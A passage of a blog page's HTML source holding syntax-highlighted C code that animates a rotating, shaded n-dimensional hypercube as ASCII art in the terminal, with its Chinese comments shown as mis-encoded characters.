vec2[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">2</span>]*dimension+i];&#125;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]=vec1[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>]*vec2[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]-vec1[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]*vec2[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">float</span> normalLength=calLength(&amp;normalResultSet[<span class="number">3</span>*normalIndex],<span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span>(normalLength!=<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]/=normalLength;</span><br><span class="line">                    <span class="keyword">if</span>(!transparent)&#123;</span><br><span class="line">                        <span class="keyword">float</span> slidedVec[<span class="number">3</span>],slideLength,vexLength=calLength(&amp;vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension],<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) slidedVec[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]+normalResultSet[<span class="number">3</span>*normalIndex+i];</span><br><span class="line">                        slideLength=calLength(slidedVec,<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">if</span>(slideLength&gt;vexLength)</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]*=<span class="number">-1</span>;&#125;&#125;&#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> axis=<span class="number">0</span>;axis&lt;d;axis++) vexProjected[vexIndex*dimension+axis]=vexProjected[vexIndex*dimension+axis]*lightSrcDis/(lightSrcDis-vexProjected[vexIndex*dimension+d]);&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sx=<span class="number">0</span>;sx&lt;size;sx++) <span class="keyword">for</span>(<span class="keyword">int</span> sy=<span class="number">0</span>;sy&lt;size;sy++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>,inside=<span class="number">1</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++,inside=<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">float</span> tCenter[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">                <span class="keyword">float</span> x[<span class="number">3</span>],y[<span class="number">3</span>],z[<span class="number">3</span>],xb[<span class="number">3</span>],yb[<span class="number">3</span>];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                    x[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension];</span><br><span class="line">                    tCenter[<span class="number">0</span>]+=x[i];</span><br><span class="line">                    y[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">1</span>];</span><br><span class="line">                    tCenter[<span class="number">1</span>]+=y[i];</span><br><span class="line">                    z[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">2</span>];</span><br><span class="line">                    xb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>];</span><br><span class="line">                    yb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>+<span class="number">1</span>];&#125;</span><br><span class="line">                tCenter[<span class="number">0</span>]/=<span class="number">3</span>;tCenter[<span class="number">1</span>]/=<span class="number">3</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>&amp;&amp;inside;i++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(     ((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            ?(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            :(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>]))</span><br><span class="line">                            ||((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])+eOffest&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            &amp;&amp;(tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])-eOffest&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])))</span><br><span class="line">                        inside=<span class="number">0</span>;&#125;</span><br><span class="line">                <span class="keyword">if</span>(inside)&#123;<span class="keyword">float</span> alpha,currentDis,p[<span class="number">4</span>];</span><br><span class="line">                    <span class="keyword">if</span>(transparent) out_f[sy][sx]=out_f[sy][sx]&lt;<span class="number">0</span>?<span class="number">1</span>:out_f[sy][sx]+<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        p[<span class="number">0</span>]= yb[<span class="number">0</span>]*z[<span class="number">1</span>] -yb[<span class="number">0</span>]*z[<span class="number">2</span>] -yb[<span class="number">1</span>]*z[<span class="number">0</span>] +yb[<span class="number">1</span>]*z[<span class="number">2</span>] +yb[<span class="number">2</span>]*z[<span class="number">0</span>] -yb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">1</span>]=-xb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">0</span>]*z[<span class="number">2</span>] +xb[<span class="number">1</span>]*z[<span class="number">0</span>] -xb[<span class="number">1</span>]*z[<span class="number">2</span>] -xb[<span class="number">2</span>]*z[<span class="number">0</span>] +xb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">2</span>]= xb[<span class="number">0</span>]*yb[<span class="number">1</span>] -xb[<span class="number">0</span>]*yb[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">0</span>] +xb[<span class="number">1</span>]*yb[<span class="number">2</span>] +xb[<span class="number">2</span>]*yb[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">3</span>]=-xb[<span class="number">0</span>]*yb[<span class="number">1</span>]*z[<span class="number">2</span>] +xb[<span class="number">0</span>]*yb[<span class="number">2</span>]*z[<span class="number">1</span>] +xb[<span class="number">1</span>]*yb[<span class="number">0</span>]*z[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">2</span>]*z[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">2</span>]*yb[<span class="number">1</span>]*z[<span class="number">0</span>];</span><br><span class="line">                        currentDis=lightSrcDis*(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)+p[<span class="number">3</span>])/(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)-p[<span class="number">2</span>]*lightSrcDis);</span><br><span class="line">                        <span class="keyword">if</span>(currentDis&gt;dis[sy][sx])&#123;</span><br><span class="line">                            alpha=<span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) alpha+=normalResultSet[normalIndex*<span class="number">3</span>+i]*light[i];</span><br><span class="line">                            dis[sy][sx]=currentDis;</span><br><span class="line">                            out_f[sy][sx]=alpha&gt;<span class="number">1</span>||alpha&lt;<span class="number">-1</span>?alpha&gt;<span class="number">1</span>?<span class="number">10</span>:<span class="number">0</span>:(alpha*<span class="number">10</span>+<span class="number">10</span>)*<span class="number">0.5</span>;&#125;&#125;&#125;&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,outIndex;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!transparent) outIndex=(<span class="keyword">int</span>)out_f[i][j];</span><br><span class="line">                <span class="keyword">else</span> outIndex=(<span class="keyword">int</span>)(<span class="built_in">pow</span>((<span class="number">1</span><span class="number">-1</span>/(transparent*out_f[i][j]+<span class="number">1</span>)),<span class="number">2</span>)*<span class="number">10</span>);</span><br><span class="line">                out_f[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[outIndex],shade[outIndex]):<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            &#125;<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;<span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);<span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);usleep(<span class="number">30000</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><div class='spoiler collapsed'>    <div class='spoiler-title'>        è¿™ä»£ç æ˜¯ç»™äººçœ‹çš„ï¼ŸÂ¯\_(ãƒ„)_/Â¯    </div>    <div class='spoiler-content'>        <p>ç¡®å®ä¸æ˜¯ç»™ä½ çœ‹çš„ï¼Œä»¥ä¸Šä»£ç å·²ç»æŠŠæ ¼å¼å‹ç¼©åˆ°æœ€å°äº†ï¼Œåªæ˜¯çœ‹èµ·æ¥æ¯”è¾ƒå¥½çœ‹è€Œå·²ï¼Œä»¥ä¸‹æ˜¯ä»¥ä¸‹æ˜¯å¸¦æ³¨é‡Šä¸æµ‹è¯•ä»£ç çš„æºç ï¼Œè¯·åœ¨windowsä¸‹ç¼–è¯‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 8.0<span class="comment">//ç«‹æ–¹ä½“è¾¹é•¿</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 55<span class="comment">//è§å¹•å¤§å°</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> delta 0.5<span class="comment">//éå†æ–¹å—çš„æ­¥é•¿</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> deltaA 0.02<span class="comment">//ç‰©ä½“æ—‹è½¬é€Ÿåº¦</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eOffest 0.001<span class="comment">//åˆ¤å®šç‚¹æ˜¯å¦åœ¨å¹³é¢å†…æ—¶çš„æ–¹ç¨‹é˜ˆå€¼</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dimension 5<span class="comment">//ç»´æ•°</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> transparent 0<span class="comment">//æ˜¯å¦ä½¿ç”¨é€æ˜æè´¨ï¼ŒåŒæ—¶æ˜¯é€æ˜çš„å€ç‡ï¼Œå››ç»´æ¨è0.75ï¼Œäº”ç»´æ¨è0.6</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åæ ‡ç³»è¯´æ˜ï¼šxå‘å³ï¼Œyå‘ä¸‹ï¼Œzå‘å‰</span></span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,:;!om0&amp;%@&quot;</span>;<span class="comment">//é˜´å½±å­—ç¬¦é›†åä¸€ä¸ªï¼Œä¾¿äºé€‰å–</span></span><br><span class="line"><span class="keyword">float</span> lightSrcDis=<span class="number">5</span>*a;<span class="comment">//é€è§†æŠ•å½±æ—¶çš„å…‰æºè·ç¦»</span></span><br><span class="line"><span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-2</span>,<span class="number">5</span>,<span class="number">0.8</span>&#125;;<span class="comment">//å¹³è¡Œå…‰å‘é‡ï¼Œé€‰å–äº†ä¸€ä¸ªæ¯”è¾ƒèˆ’æœçš„æ‰“å…‰</span></span><br><span class="line"><span class="keyword">int</span> rotateAround[]=&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;<span class="comment">//ç¡®å®šæ—‹è½¬åŸºå‡†ï¼ŒæŒ‡å®šå‚ä¸æ—‹è½¬çš„æ–¹å‘ï¼Œä¸¤ä¸ªä¸€ç»„ï¼Œä¸€ç»„ä¸­å°çš„åœ¨å‰å¤§çš„åœ¨å</span></span><br><span class="line"><span class="keyword">float</span> vAxis[]     =&#123; <span class="number">3</span> , <span class="number">2</span> , <span class="number">1</span> &#125;;<span class="comment">//å¯¹åº”ä¸Šè¾¹çš„é…é€Ÿå€ç‡</span></span><br><span class="line"><span class="keyword">float</span> initialCam[<span class="number">3</span>]=&#123;<span class="number">0</span>,pi*<span class="number">5</span>/<span class="number">24</span>,<span class="number">0</span>&#125;;<span class="comment">//æ°´å¹³æ—‹è½¬ å‰åå€¾æ–œ å·¦å³å€¾æ–œï¼Œæ³¨æ„ç”¨å¼§åº¦è§’ï¼Œå¦‚ pi/4</span></span><br><span class="line"><span class="comment">/*initialObj[å·²åˆ é™¤]ï¼šæ­£æ–¹ä½“åˆå§‹æ‘†æ”¾çš„è§’åº¦ï¼›initialObjï¼šæ‘„åƒæœºåˆå§‹æ‘†æ”¾çš„è§’åº¦</span></span><br><span class="line"><span class="comment">æ—‹è½¬é¡ºåºï¼šinitialObj â†’ rotateAround â†’ initialCam</span></span><br><span class="line"><span class="comment">initialObjæ„Ÿè§‰ç”¨å¤„ä¸å¤§ï¼Œåˆ äº†ç®—äº†*/</span></span><br><span class="line"><span class="comment">/*è®¡ç®—å‘é‡æ¨¡é•¿</span></span><br><span class="line"><span class="comment">--------------------</span></span><br><span class="line"><span class="comment">Par:</span></span><br><span class="line"><span class="comment">    vec[]ï¼šå‘é‡</span></span><br><span class="line"><span class="comment">    lenï¼šå…ƒç´ ä¸ªæ•°</span></span><br><span class="line"><span class="comment">--------------------*/</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">calLength</span><span class="params">(<span class="keyword">float</span> *vec,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++) result+=vec[i]*vec[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    COORD pos=&#123;<span class="number">0</span>,<span class="number">0</span>&#125;;<span class="comment">//å…‰æ ‡å›é›¶</span></span><br><span class="line">    <span class="keyword">float</span> lightLength=calLength(&amp;light[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) light[i]/=lightLength;<span class="comment">//å•ä½åŒ–å¹³è¡Œå…‰å‘é‡</span></span><br><span class="line">    <span class="keyword">float</span> out_f[size][size],dis[size][size]=&#123;(<span class="keyword">float</span>)<span class="number">4</span>*size&#125;;<span class="comment">//è®°å½•äº®åº¦ï¼Œæ˜ å°„åˆ°å­—ç¬¦é›† | è®°å½•ä¸‰ç»´æŠ•å½±ååˆ°å±å¹•æœ€å°è·ç¦»ï¼Œç”±æ­¤åˆ¤æ–­é®ç½©å…³ç³»</span></span><br><span class="line">    <span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;<span class="comment">//ä»åæ ‡åŸç‚¹(å±å¹•å·¦ä¸Šè§’)åç§»åˆ°å±å¹•ä¸­å¿ƒæ‰€éœ€çš„åç§»é‡</span></span><br><span class="line">    <span class="keyword">int</span> face=((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension<span class="number">-3</span>)*dimension*(dimension<span class="number">-1</span>)));</span><br><span class="line">    <span class="comment">/*  é¢æ•°å…¬å¼è§£é‡Š</span></span><br><span class="line"><span class="comment">        æ¯ä¸ª n ç»´æ­£æ–¹ä½“ä¸­çš„æ¯ä¸ª m ç»´è¾¹ç•Œéƒ½ä¼šè¢« n-m ä¸ª m+1 ç»´è¾¹ç•Œå…±ç”¨ã€‚æ¯”å¦‚æ­£å…­é¢ä½“ä¸­ï¼Œæ¯æ¡æ£±è¢«ä¸¤ä¸ªé¢å…±ç”¨ï¼Œè€Œæ¯ä¸ªé¡¶ç‚¹è¢«ä¸‰æ¡æ£±å…±ç”¨ã€‚</span></span><br><span class="line"><span class="comment">        è¿™æ ·ç®—æ¥ï¼Œå¯¹äºä»»æ„ä¸€ä¸ª n ç»´çš„æ­£æ–¹ä½“ï¼Œè®¡ç®—å…¶ä¸é‡å¤çš„äºŒç»´æ­£æ–¹å½¢è¡¨é¢çš„æ•°é‡åº”è¯¥ä¸ºï¼š</span></span><br><span class="line"><span class="comment">          6x8x10x...x(2n)/(2*3*...*(n-2))</span></span><br><span class="line"><span class="comment">        =(2^(n-2))*(n!)/2/(n-2)!</span></span><br><span class="line"><span class="comment">        =(2^(n-3))*n*(n-1)*/</span></span><br><span class="line">    <span class="keyword">int</span> vexNum=(<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension))*dimension;<span class="comment">//é¡¶ç‚¹ä¸ªæ•°*ç»´æ•°</span></span><br><span class="line">    <span class="keyword">int</span> vexLink[vexNum],normalLink[<span class="number">6</span>*face];<span class="comment">//ç›¸é‚»é¡¶ç‚¹é›†ï¼Œå¦‚ï¼šä¸‰ç»´ä¸­0å·é¡¶ç‚¹ä¸1ï¼Œ3ï¼Œ7ç›¸é‚»ï¼Œåˆ™å‰dimensionä¸ªå…ƒç´ ä¸º1ï¼Œ3ï¼Œ7 | åŒç†ï¼Œæ³•å‘é‡å¯¹åº”ä¸‰è§’å½¢é¢çš„ä¸‰ä¸ªvexçš„index</span></span><br><span class="line">    <span class="keyword">float</span> vex[vexNum],vexO[vexNum],vexProjected[vexNum],vexTemp[vexNum];<span class="comment">//å½“å‰é¡¶ç‚¹åæ ‡ | åŸå§‹é¡¶ç‚¹åæ ‡ | æŠ•å½±åé¡¶ç‚¹åæ ‡ | ä¸´æ—¶</span></span><br><span class="line">    <span class="keyword">float</span> normalResultSet[<span class="number">6</span>*face];<span class="comment">//æ³•å‘é‡ç»“æœé›†</span></span><br><span class="line">    <span class="built_in">memset</span>(vexLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(vexLink));<span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">    <span class="built_in">memset</span>(normalLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(normalLink));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum;i++) vex[i]=a;</span><br><span class="line">    vex[dimension]=-a;<span 